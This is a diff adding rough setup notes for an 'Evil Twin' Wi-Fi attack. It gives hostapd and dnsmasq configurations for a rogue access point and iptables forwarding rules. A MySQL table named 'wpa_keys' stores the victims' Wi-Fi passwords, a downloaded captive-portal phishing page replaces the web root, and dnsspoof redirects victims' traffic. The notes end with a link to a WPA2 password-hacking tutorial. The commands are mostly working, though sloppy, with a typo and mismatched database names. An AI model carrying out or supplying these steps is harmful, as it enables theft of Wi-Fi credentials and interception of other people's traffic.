@@ -1,0 +1,158 @@
+sudo apt-get install hostapd dnsmasq
+
+airmon-ng start waln0
+ mkdir ~/ftp
+
+===============
+nano hostapd.conf
+============
+
+interface=wlan0mon
+driver=nl80211
+ssid=ADAM-ALWAN
+hw_mode=g
+channel=1
+macaddr_acl=0
+ignore_broadcast_ssid=0
+
+
+------------------------
+2
+-----------------
+*//
+interface=wlan0mon
+driver=nl80211
+ssid=Adam-Net 
+hw_mode=g 
+channel=8           
+macaddr_acl=0
+ignore_broadcast_ssid=0
+#auth_algs=1
+#wpa=2   
+#wpa_key_mgmt=WPA-PSK
+#rsn_pairwise=TKIP
+#wpa_passphrase=somepassword
+//*
+
+
+
+$ hostapd hostapd.conf
+==============================
+nano dnsmasq.conf
+======================
+interface=wlan0mon
+dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
+dhcp-option=3,192.168.1.1
+dhcp-option=6,192.168.1.1
+server=8.8.8.8
+log-queries
+log-dhcp
+listen-address=127.0.0.1
+
+
+============================================
+#Routing table and gateway:
+============
+
+ifconfig wlan0mon up 192.168.1.1 netmask 255.255.255.0
+route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
+
+dnsmasq -C dnsmasq.conf -d
+
+=====================================
+
+#Internet access:
+==================
+
+iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
+iptables --append FORWARD --in-interface wlan0mon -j ACCEPT
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+
+=============================
+
+mysql database:
+
+=====================
+
+service mysql start
+
+
+mysql
+
+
+create database fap;
+
+create user fapuser;
+
+grant all on groueap.* to 'fapuser'@'localhost' identified by 'fappassword';
+
+
+use fap;
+
+create table wpa_keys(password1 varchar(40), password2 varchar(40));
+
+ALTER DATABASE fap CHARACTER SET 'utf8';
+
+select * from wpa_keys;
+
+
+
+==============================
+# Captive portal setup:
+
+https://drive.google.com/file/d/1xChAUOHPiWiejbEKYmdyW--9aj7COzUR/view
+
+ -   unzip rogueap.zip 
+
+ rm -rf /var/www/html/*
+
+cp /root/Evil-Twin-Attack-Adam/rogueap.zip /var/www/html
+
+ cd /var/www/html
+
+  unzip rogueap.zip
+
+  service apache2 start
+
+=========================
+
+#--- starting the attack ---:
+
+======================
+  
+ cd /ftp
+
+ hostapd hostapd.conf
+
+
+ dnsmasq -C dnsmasq.conf -d
+
+ dnsspoof -i wlan0mon
+
+
+
+
+https://www.thecybersploit.com/2019/12/Hacking-WPA2-Wi-Fi-password-using-Evil-Twin-Attack.html
+
+
+
+
+ sudo rfkill unblock wifi
+
+  rfkill list
+
+
+sudo systemctl start hostapd
+sudo systemctl unmask hostapd
+sudo systemctl enable hostapd
+sudo systemctl start hostapd
+
+
+
+
+
+
+
+
